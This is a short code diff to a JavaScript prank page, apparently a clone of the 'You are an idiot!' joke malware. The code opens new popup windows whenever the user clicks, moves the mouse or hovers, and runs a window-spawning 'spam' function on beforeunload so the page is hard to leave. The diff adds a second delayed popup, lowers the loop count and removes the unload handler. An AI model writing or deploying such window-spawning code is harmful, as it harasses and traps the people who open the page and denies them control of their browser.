@@ -12,9 +12,13 @@ function reopen() {
     "",
     "blankmenubar=no,status=no,toolbar=noresizable=no,width=350,height=370,titlebar=no,alwaysRaised=yes"
   );
+
+  setTimeout(() => {
+    window.open("popup2.html", "", "menubar=no,status=no,toolbar=no,resizable=no,width=350,height=370,titlebar=no,alwaysRaised=yes");
+  }, 1000);
 }
 function spam() {
-  for (var i = 0; i < 10; i++) {
+  for (var i = 0; i < 3; i++) {
     reopen();
   }
   return "You are an idiot!";
@@ -23,7 +27,6 @@ function init() {
   document.body.onclick = reopen;
   document.body.onmouseover = reopen;
   document.body.onmousemove = reopen;
-  window.onunload = spam;
   window.onbeforeunload = spam;
   playBall();
   if (bookmark) {
